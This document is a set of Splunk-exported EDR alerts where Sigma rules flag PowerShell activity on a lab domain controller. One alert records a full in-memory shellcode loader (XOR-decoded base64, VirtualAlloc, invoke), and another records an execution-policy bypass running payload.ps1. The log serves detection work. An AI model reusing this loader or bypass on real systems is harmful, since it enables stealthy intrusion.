{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{BF6FE7CE-3AE2-0003-8FEE-6FBFE23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"496\",\"Execution_ThreadID\":\"5580\",\"Keywords\":\"0x0\",\"Level\":\"3\",\"Match_Strings\":\"GetProcAddress in ScriptBlockText, GetModuleHandle in ScriptBlockText, GetDelegateForFunctionPointer in ScriptBlockText, kernel32 in ScriptBlockText, VirtualAlloc in ScriptBlockText, GetDelegateForFunctionPointer in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"Nikita Nazarov, oscd.community\",\"Rule_Description\":\"Detecting use WinAPI Functions in PowerShell\",\"Rule_FalsePositives\":\"Carbon PowerShell Module (https://github.com/webmd-health-services/Carbon)\",\"Rule_Id\":\"03d83090-8cba-44a0-b02f-0b756a050306\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_accessing_win_api.yml\",\"Rule_Modified\":\"2022/02/23\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_accessing_win_api.yml\",\"Rule_References\":\"https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Accessing WinAPI in PowerShell\",\"ScriptBlockId\":\"382f8fe4-6bda-408f-96da-bad65e54f5e5\",\"ScriptBlockText\":\"Set-StrictMode -Version 2\\n\\nfunction func_get_proc_address {\\n\\tParam ($var_module, $var_procedure)\\t\\t\\n\\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\\n\\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\\n\\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\\n}\\n\\nfunction func_get_delegate_type {\\n\\tParam (\\n\\t\\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\\n\\t\\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\\n\\t)\\n\\n\\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\\n\\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\\n\\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\\n\\n\\treturn $var_type_builder.CreateType()\\n}\\n\\nIf ([IntPtr]::size -eq 8) {\\n\\t[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim3MjIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDElSVkZRWg4QDRANEQ1QT0pODU5KTQ1JUCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOdyNiQEBGU1cZA1dGW1cMS1dOTw9CU1NPSkBCV0pMTQxbS1dOTwhbTk8PQlNTT0pAQldKTE0MW05PGFIeEw0aDwkMCRhSHhMNGy4pYkBARlNXDm9CTURWQkRGGQNGTQ52cA9GTRhSHhMNFi4pcUZFRlFGURkDS1dXUxkMDEBMR0YNSVJWRlFaDUBMTgwuKWJAQEZTVw5mTUBMR0pNRBkDRFlKUw8DR0ZFT0JXRi4pdlBGUQ5iREZNVxkDbkxZSk9PQgwWDRMDC3RKTUdMVFADbXcDFQ0QGAN3UUpHRk1XDBQNExgDUVUZEhINEwoDT0pIRgNkRkBITC4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnAjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayaMLCMjc+DLvN7c3BYXDRIbGw0WGg0VGyMjIyMj')\\n\\n\\tfor ($x = 0; $x -lt $var_code.Count; $x++) {\\n\\t\\t$var_code[$x] = $var_code[$x] -bxor 35\\n\\t}\\n\\n\\t$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\\n\\t$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\\n\\t[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\\n\\n\\t$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\\n\\t$var_runme.Invoke([IntPtr]::Zero)\\n}\\n\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:13.9624005Z\",\"Version\":\"1\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:15Z\"}","_time":"2022-03-18T16:29:16.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{BF6FE7CE-3AE2-0003-89EE-6FBFE23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"496\",\"Execution_ThreadID\":\"5580\",\"Keywords\":\"0x0\",\"Level\":\"3\",\"Match_Strings\":\"Set-ExecutionPolicy in ScriptBlockText, Bypass in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"frack113\",\"Rule_Description\":\"Detects use of Set-ExecutionPolicy to set a unsecure policies\",\"Rule_FalsePositives\":\"Administrator script\",\"Rule_Id\":\"61d0475c-173f-4844-86f7-f3eebae1c66b\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_set_policies_to_unsecure_level.yml\",\"Rule_Modified\":\"2022/02/23\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_set_policies_to_unsecure_level.yml\",\"Rule_References\":\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1, https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1, https://adsecurity.org/?p=2604\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Change PowerShell Policies to an Unsecure Level\",\"ScriptBlockId\":\"577f38b6-f70b-4719-ae3d-6bf600c850f7\",\"ScriptBlockText\":\"if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; \\u0026 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\payload.ps1'\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:13.7085241Z\",\"Version\":\"1\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:15Z\"}","_time":"2022-03-18T16:29:16.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" \\\"-Command\\\" \\\"if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; \\u0026 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\payload.ps1'\\\"\",\"Company\":\"Microsoft Corporation\",\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{00000000-0000-0000-0000-000000000000}\",\"CurrentDirectory\":\"C:\\\\Users\\\\Administrator\\\\Desktop\\\\\",\"Description\":\"Windows PowerShell\",\"EventID\":\"1\",\"Execution_ProcessID\":\"2832\",\"Execution_ThreadID\":\"2320\",\"FileVersion\":\"10.0.14393.206 (rs1_release.160915-0644)\",\"Hashes\":\"MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"IntegrityLevel\":\"High\",\"Keywords\":\"0x8000000000000000\",\"Level\":\"4\",\"LogonGuid\":\"{ffdf7e68-b2dc-6234-1c51-410000000000}\",\"LogonId\":\"0x41511C\",\"Match_Strings\":\"payload.ps1 in CommandLine\",\"Module\":\"Sigma\",\"Opcode\":\"0\",\"OriginalFileName\":\"PowerShell.EXE\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE /NOUACCHECK\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{ffdf7e68-b2de-6234-4d04-000000004102}\",\"ParentProcessId\":\"4736\",\"ProcessGuid\":\"{ffdf7e68-b358-6234-0405-000000004102}\",\"ProcessId\":\"496\",\"Product\":\"Microsoft® Windows® Operating System\",\"Provider_Guid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Provider_Name\":\"Microsoft-Windows-Sysmon\",\"RuleName\":\"-\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\",\"Rule_FalsePositives\":\"Legitimate tools that accidentally match on the searched patterns\",\"Rule_Id\":\"efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_progname.yml\",\"Rule_Modified\":\"2022/02/11\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_progname.yml\",\"Rule_References\":\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Program Names\",\"Security_UserID\":\"S-1-5-18\",\"Task\":\"1\",\"TerminalSessionId\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:12.531929Z\",\"User\":\"ATTACKRANGE\\\\Administrator\",\"UtcTime\":\"2022-03-18 16:29:12.523\",\"Version\":\"5\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:13Z\"}","_time":"2022-03-18T16:27:39.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\\\\\\\\\.\\\\.\\\"_\\\"-\\\"_\\\"((-_)_-_'')_{_-_-__","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\bevbrzvz\\\\bevbrzvz.cmdline\\\"\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"307501\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"6732\",\"Image\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"\\\\AppData\\\\ in CommandLine, \\\\csc.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"6512\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"6772\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\"Rule_FalsePositives\":\"https://twitter.com/gN3mes1s/status/1206874118282448897, https://twitter.com/gabriele_pippi/status/1206907900268072962\",\"Rule_Id\":\"dcaa3f04-70c3-427a-80b4-b870d73c94c4\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml\",\"Rule_Modified\":\"2021/02/01\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_csc_folder.yml\",\"Rule_References\":\"https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/, https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf, https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/, https://twitter.com/gN3mes1s/status/1206874118282448897\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Csc.exe Source File Folder\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0x41511c\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:27:38.2848801Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:27:47Z\"}","_time":"2022-03-18T16:27:39.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\.\\\\\\\\..\\\\.\\\"_/_/_@\\\":\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\bevbrzvz\\\\bevbrzvz.cmdline\\\"\",\"Company\":\"Microsoft Corporation\",\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{00000000-0000-0000-0000-000000000000}\",\"CurrentDirectory\":\"C:\\\\Windows\\\\system32\\\\\",\"Description\":\"Visual C# Command Line Compiler\",\"EventID\":\"1\",\"Execution_ProcessID\":\"2832\",\"Execution_ThreadID\":\"2320\",\"FileVersion\":\"4.8.3761.0 built by: NET48REL1\",\"Hashes\":\"MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D\",\"Image\":\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe\",\"IntegrityLevel\":\"High\",\"Keywords\":\"0x8000000000000000\",\"Level\":\"4\",\"LogonGuid\":\"{ffdf7e68-b2dc-6234-1c51-410000000000}\",\"LogonId\":\"0x41511C\",\"Match_Strings\":\"\\\\AppData\\\\ in CommandLine, \\\\csc.exe in Image\",\"Module\":\"Sigma\",\"Opcode\":\"0\",\"OriginalFileName\":\"csc.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe  -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted \\\"Import-Module \\\"C:\\\\ProgramData\\\\Amazon\\\\EC2-Windows\\\\Launch\\\\Module\\\\Ec2Launch.psd1\\\"; Set-Wallpaper -Initial\\\" \",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{ffdf7e68-b2f7-6234-a304-000000004102}\",\"ParentProcessId\":\"6772\",\"ProcessGuid\":\"{ffdf7e68-b2fa-6234-a704-000000004102}\",\"ProcessId\":\"6512\",\"Product\":\"Microsoft® .NET Framework\",\"Provider_Guid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Provider_Name\":\"Microsoft-Windows-Sysmon\",\"RuleName\":\"-\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)\",\"Rule_FalsePositives\":\"https://twitter.com/gN3mes1s/status/1206874118282448897, https://twitter.com/gabriele_pippi/status/1206907900268072962\",\"Rule_Id\":\"dcaa3f04-70c3-427a-80b4-b870d73c94c4\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml\",\"Rule_Modified\":\"2021/02/01\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_csc_folder.yml\",\"Rule_References\":\"https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/, https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf, https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/, https://twitter.com/gN3mes1s/status/1206874118282448897\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Csc.exe Source File Folder\",\"Security_UserID\":\"S-1-5-18\",\"Task\":\"1\",\"TerminalSessionId\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:27:38.3260883Z\",\"User\":\"ATTACKRANGE\\\\Administrator\",\"UtcTime\":\"2022-03-18 16:27:38.284\",\"Version\":\"5\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:27:39Z\"}","_time":"2022-03-18T16:27:39.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\.\\\\\\\\..\\\\.\\\"_/_/_@\\\":\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
